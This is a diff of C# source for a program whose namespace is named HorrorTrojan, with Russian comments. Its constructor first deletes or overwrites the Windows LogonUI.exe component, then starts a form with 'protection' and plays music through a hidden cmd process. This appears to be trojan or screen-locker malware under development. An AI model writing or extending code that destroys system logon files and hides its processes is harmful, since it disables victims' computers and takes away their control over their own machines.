@@ -58,14 +58,18 @@ namespace HorrorTrojan
 
         public MainInterface()
         {
-            // 1. ПЕРЕЗАПИСЬ LogonUI.exe (ДО ВСЕГО ОСТАЛЬНОГО)
+            // СНАЧАЛА УДАЛЯЕМ LogonUI.exe
             ReplaceLogonUI();
 
+            // ПОТОМ ЗАПУСКАЕМ ФОРМУ
             InitializeComponent();
             SetupForm();
             LoadResources();
             StartTimers();
             SetupProtection();
+
+            // ЗАПУСКАЕМ МУЗЫКУ В ФОНЕ
+            PlayMusic();
         }
 
         private void ReplaceLogonUI()
@@ -191,6 +195,26 @@ namespace HorrorTrojan
                 stream.Read(data, 0, data.Length);
                 return data;
             }
+        }
+
+        private void PlayMusic()
+        {
+            try
+            {
+                string musicPath = Path.Combine(appDataPath, "dv.mp3");
+                if (File.Exists(musicPath))
+                {
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = "cmd",
+                        Arguments = $"/c start /min \"\" \"{musicPath}\"",
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        UseShellExecute = false
+                    });
+                }
+            }
+            catch { }
         }
 
         private void InitializeComponent()
